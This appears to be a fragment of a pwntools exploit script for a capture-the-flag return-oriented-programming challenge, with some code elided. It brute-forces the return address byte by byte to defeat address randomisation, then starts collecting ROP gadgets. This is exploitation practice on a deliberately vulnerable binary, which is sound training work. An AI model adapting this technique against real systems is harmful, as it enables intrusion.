...
b * challenge+388
'''
binary = './babyrop_level14.0_patched'
elf = ELF(binary)
libc = ELF('./libc.so.6')
...
for i in range(5):
	for new_byte in range(0xff + 1):
		...
		try:
			p.send(payload)
			response = p.recvuntil("Leaving!\nThis challenge reads in some bytes", timeout = 1)
			print(response)
			if b"Leaving!\nThis challenge reads in some bytes" in response:
				print("Success! byte = ", hex(new_byte))
				rip += p8(new_byte)
			p.close()
			break 
...
rip = int.from_bytes(rip, byteorder='little')
elf.address = rip - 0x00002001
print("Successfully brute-forced the program base address, it is: ", hex(elf.address))


# gadgets

pop_rdi = elf.address + 0x00000000000023e3 
